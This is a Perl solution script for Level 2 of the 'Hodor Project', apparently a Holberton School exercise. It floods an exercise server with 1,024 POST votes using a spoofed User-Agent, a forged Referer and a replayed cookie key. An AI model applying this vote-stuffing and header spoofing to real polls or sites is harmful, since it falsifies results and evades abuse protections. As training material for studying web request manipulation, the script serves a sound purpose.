#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use Data::Dump "pp"; # Used to print the request object, if desired.

=pod
 * ===---Description------------------------------------------------------------===
 *   Solution for the Hodor Project, Level 2 by Julien Barbier.
 *   Using a simple Perl script.
 *
 *   by Alexandro de Oliveira, for Holberton School
 * ===--------------------------------------------------------------------------===
=cut

# Defining the URL:
my $url = 'http://173.246.108.142/level2.php';
# Setting the cookie:
my $cookie = "6b695713db9b371a855adf1e229264c681f2e48";
# Setting the body of http request:
my $params = {
    id => "23",
    holdthedoor => 'submit',
    key => $cookie
};
# Options for the LWP Constructor:
my %options = (
    agent => "Windows NT 100000000000000 (spoofing the User-Agent) havk64 - Perl script requests",
    timeout => 10
);
# LWP is the "Library for WWW in Perl":
my $ua  = LWP::UserAgent->new(%options);
# Setting the header:
$ua->default_header('Referer' => $url);
$ua->default_header('Cookie' => "HoldTheDoor=$cookie");
# Optionally print the request header:
# print pp($ua);

my $counter = 0; # Initializing the voute counter.
for(my $i = 0; $i < (1 << 10); $i++) {
    my $request = $ua->post($url, $params);
    # To print the server headers:
    # print $request->headers_as_string;
    my $check = $request->header('Set-Cookie');
    my $pattern = 'HoldTheDoor';
    if(defined($check) && $check =~ m/$pattern/) { # Using regexp to check if the vote was confirmed.
        print "Vote number: @{[$counter + 1]}\n";  # Evaluation and string interpolation.
                $counter++;
    } else {
        print "Post error...(vote not computed)\n";
    }
    # To print the body:
    # print $request->decoded_content();
}
# Printing the total of valid votes.
print "Total of valid votes: $counter\n";